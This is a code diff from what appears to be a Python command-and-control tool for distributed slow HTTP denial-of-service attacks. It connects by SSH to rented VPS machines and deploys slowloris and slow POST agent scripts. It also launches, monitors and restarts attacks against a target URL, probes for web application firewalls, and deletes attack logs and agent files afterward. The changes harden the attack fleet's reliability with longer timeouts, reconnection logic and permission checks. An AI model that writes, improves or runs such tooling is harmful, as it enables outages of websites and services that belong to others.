@@ -796,7 +796,7 @@ class SSHManager:
         self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
         self.cache_lock = threading.Lock()
     
-    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
+    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=25):
         """Connect to a VPS with comprehensive error handling"""
         if not SSH_AVAILABLE:
             return False, "SSH functionality not available (paramiko not installed)"
@@ -839,7 +839,17 @@ class SSHManager:
         except socket.error as e:
             return False, f"Socket error: {str(e)}"
         except Exception as e:
-            return False, str(e)
+            error_msg = str(e).lower()
+            if "timed out" in error_msg:
+                return False, f"Connection timed out - VPS may be slow or overloaded"
+            elif "refused" in error_msg:
+                return False, f"Connection refused - check if SSH service is running on port {port}"
+            elif "unreachable" in error_msg:
+                return False, f"Network unreachable - check VPS IP address and network"
+            elif "authentication" in error_msg:
+                return False, f"Authentication failed - check username and password"
+            else:
+                return False, f"Connection error: {str(e)}"
     
     def reconnect_vps(self, ip):
         """Attempt to reconnect to VPS using cached credentials"""
@@ -886,6 +896,19 @@ class SSHManager:
                     return False, "No connection to VPS"
             
             try:
+                # Test connection first
+                transport = self.connections[ip].get_transport()
+                if not transport or not transport.is_active():
+                    logger.warning(f"Connection to {ip} is not active, reconnecting...")
+                    if ip in self.connections:
+                        del self.connections[ip]
+                    if auto_reconnect:
+                        success, message = self.reconnect_vps(ip)
+                        if not success:
+                            return False, f"Reconnection failed: {message}"
+                    else:
+                        return False, "Connection not active"
+                
                 stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
                 exit_status = stdout.channel.recv_exit_status()
                 output = stdout.read().decode('utf-8', errors='replace')
@@ -1033,11 +1056,22 @@ class SSHManager:
             return False, "No connection to VPS"
         
         try:
+            # Check if Python3 is available first
+            python_success, python_output = self.execute_command(ip, "python3 --version", timeout=20)
+            if not python_success:
+                return False, f"Python3 not available: {python_output}"
+            
             # Create directory for agent
             mkdir_cmd = "mkdir -p ~/slowhttp_agent"
-            success, output = self.execute_command(ip, mkdir_cmd)
+            success, output = self.execute_command(ip, mkdir_cmd, timeout=25)
             if not success:
                 return False, f"Failed to create agent directory: {output}"
+            
+            # Test write permissions
+            test_cmd = "touch ~/slowhttp_agent/test.txt && rm ~/slowhttp_agent/test.txt"
+            perm_success, perm_output = self.execute_command(ip, test_cmd, timeout=20)
+            if not perm_success:
+                return False, f"No write permissions in agent directory: {perm_output}"
             
             # Get appropriate agent script
             if agent_type == "advanced":
@@ -1108,8 +1142,32 @@ class SSHManager:
             return None
     
     def get_connection_status(self, ip):
-        """Check if connection to VPS is active"""
-        return ip in self.connections
+        """Check if connection to VPS is active and working"""
+        if ip not in self.connections:
+            return False
+        
+        try:
+            transport = self.connections[ip].get_transport()
+            if transport and transport.is_active():
+                return True
+            else:
+                # Remove inactive connection
+                if ip in self.connections:
+                    try:
+                        self.connections[ip].close()
+                    except:
+                        pass
+                    del self.connections[ip]
+                return False
+        except:
+            # Remove broken connection
+            if ip in self.connections:
+                try:
+                    self.connections[ip].close()
+                except:
+                    pass
+                del self.connections[ip]
+            return False
     
     def _get_standard_agent_script(self):
         """Get the standard agent script for slowloris and slow POST attacks"""
@@ -3270,7 +3328,7 @@ class NetworkTools:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
             }
-            response = requests.get(url, headers=headers, timeout=10)
+            response = requests.get(url, headers=headers, timeout=20)
             
             # Check headers for WAF indicators
             waf_headers = {
@@ -3832,7 +3890,7 @@ class AttackManager:
                 cmd = self._build_attack_command(target_url, attack_type, parameters)
                 
                 # Execute with longer timeout
-                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
+                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
                 
                 if success:
                     # Start monitoring thread for this VPS
@@ -3964,7 +4022,7 @@ class AttackManager:
             try:
                 # Get attack stats from VPS
                 cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep"
-                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                 
                 if not success or not output:
                     # Process not found, attack might have stopped
@@ -3997,7 +4055,7 @@ class AttackManager:
                 
                 # Get CPU and memory usage
                 cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
-                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                 
                 cpu_usage = None
                 memory_usage = None
@@ -4013,7 +4071,7 @@ class AttackManager:
                 
                 # Try to get attack stats from log file
                 cmd = "cd ~/slowhttp_agent && cat attack_*.log | grep -a 'Status:' | tail -1"
-                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                 
                 connections_active = 0
                 packets_sent = 0
@@ -4084,7 +4142,7 @@ class AttackManager:
         )
         
         # Execute with longer timeout
-        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
+        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
         
         if success:
             logger.info(f"Successfully restarted attack on {vps_ip}")
@@ -4124,7 +4182,7 @@ class AttackManager:
             
             # Kill agent.py processes and cleanup
             cmd = "pkill -f 'python3 agent.py' && rm -f ~/slowhttp_agent/attack_*.log"
-            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
             
             if success:
                 print(f"{Colors.GREEN}STOPPED{Colors.RESET}")
@@ -4135,7 +4193,7 @@ class AttackManager:
         print(f"\n{Colors.YELLOW}[CLEANUP] Removing agent files...{Colors.RESET}")
         for vps_ip in attack_info['vps_list']:
             cleanup_cmd = "rm -rf ~/slowhttp_agent"
-            self.ssh_manager.execute_command(vps_ip, cleanup_cmd, timeout=10)
+            self.ssh_manager.execute_command(vps_ip, cleanup_cmd, timeout=20)
         
         # Update attack status in database
         self.db_manager.update_attack_status(session_id, 'completed')
@@ -4463,11 +4521,11 @@ class SlowHTTPTUI:
             ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
             print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
             
-            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
+            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=20)
             
             if success:
                 # Test command execution
-                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
+                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=20)
                 if cmd_success:
                     print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                     self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
